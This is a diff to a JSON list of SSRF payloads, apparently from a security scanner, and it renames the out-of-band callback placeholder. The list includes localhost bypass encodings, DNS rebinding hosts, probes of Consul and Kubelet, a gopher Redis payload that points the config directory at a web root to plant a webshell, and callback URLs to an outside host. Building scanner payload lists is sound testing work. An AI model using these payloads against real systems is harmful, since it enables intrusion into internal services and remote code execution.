@@ -27,7 +27,7 @@
   {"value": "http://2130706433:80", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "Decimal IP bypass 127.0.0.1", "severity_hint": "high"},
   {"value": "http://0x7f000001:80", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "Hex IP bypass 127.0.0.1", "severity_hint": "high"},
   {"value": "http://127.1:80", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "Short IP bypass", "severity_hint": "high"},
-  {"value": "http://spoofed.burpcollaborator.net", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "DNS rebinding bypass (collaborator)", "severity_hint": "critical"},
+  {"value": "http://{{oob}}", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "DNS rebinding bypass (collaborator)", "severity_hint": "critical"},
   {"value": "http://127.0.0.1.nip.io", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "nip.io DNS localhost bypass", "severity_hint": "high"},
   {"value": "http://localtest.me", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "localtest.me DNS bypass", "severity_hint": "high"},
   {"value": "http://127.0.0.1:8500/v1/kv/", "encoding": "raw", "context": "url", "targets": ["consul","generic"], "description": "Consul KV store probe", "severity_hint": "critical"},
@@ -52,7 +52,7 @@
   {"value": "http://127.0.0.1:10250/pods", "encoding": "raw", "context": "url", "targets": ["k8s","generic"], "description": "Kubelet pod listing", "severity_hint": "critical"},
   {"value": "http://127.0.0.1:10255/healthz", "encoding": "raw", "context": "url", "targets": ["k8s","generic"], "description": "Kubelet healthz endpoint", "severity_hint": "high"},
   {"value": "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html", "encoding": "raw", "context": "url", "targets": ["redis","php","generic"], "description": "Gopher Redis webshell config", "severity_hint": "critical"},
-  {"value": "http://{{oob_url}}/ssrf-probe", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "OOB HTTP callback probe", "severity_hint": "critical"},
-  {"value": "http://{{oob_url}}:80/ssrf", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "OOB callback with explicit port", "severity_hint": "critical"},
-  {"value": "gopher://{{oob_url}}:80/_SSRF", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "OOB gopher protocol probe", "severity_hint": "critical"}
+  {"value": "http://{{oob}}/ssrf-probe", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "OOB HTTP callback probe", "severity_hint": "critical"},
+  {"value": "http://{{oob}}:80/ssrf", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "OOB callback with explicit port", "severity_hint": "critical"},
+  {"value": "gopher://{{oob}}:80/_SSRF", "encoding": "raw", "context": "url", "targets": ["generic"], "description": "OOB gopher protocol probe", "severity_hint": "critical"}
 ]
